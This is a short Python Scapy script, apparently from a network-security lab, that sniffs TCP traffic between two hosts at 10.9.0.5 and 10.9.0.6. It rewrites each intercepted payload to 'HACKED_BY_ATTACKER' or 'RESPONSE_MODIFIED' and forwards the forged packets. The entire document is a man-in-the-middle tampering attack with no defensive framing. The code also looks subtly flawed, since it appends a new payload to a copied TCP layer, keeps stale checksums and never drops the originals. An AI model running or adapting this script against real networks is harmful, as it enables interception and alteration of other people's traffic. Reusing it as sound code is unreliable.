from scapy.all import *

A_ip = "10.9.0.5"
B_ip = "10.9.0.6"

def callback(pkt):

    # Only process packets that go between A and B
    if IP in pkt and Raw in pkt:
        ip = pkt[IP]
        raw = pkt[Raw]

        # Packet A → B
        if ip.src == A_ip and ip.dst == B_ip:
            print("[+] Intercepted packet from A to B")
            print("    Original Payload:", raw.load)

            # Modify payload
            new_payload = b"HACKED_BY_ATTACKER"

            # Build modified packet
            new_pkt = IP(src=ip.src, dst=ip.dst) / pkt[TCP].copy() / Raw(load=new_payload)

            # Forward modified packet
            send(new_pkt, verbose=False)
            print("    >> Modified packet forwarded.")

        # Packet B → A (optional)
        elif ip.src == B_ip and ip.dst == A_ip:
            print("[+] Intercepted packet from B to A")
            print("    Original Payload:", raw.load)

            new_payload = b"RESPONSE_MODIFIED"

            new_pkt = IP(src=ip.src, dst=ip.dst) / pkt[TCP].copy() / Raw(load=new_payload)

            send(new_pkt, verbose=False)
            print("    >> Modified packet forwarded back to A.")


print("[*] Sniffing and modifying packets...")

sniff(filter="tcp", iface="eth0", prn=callback)
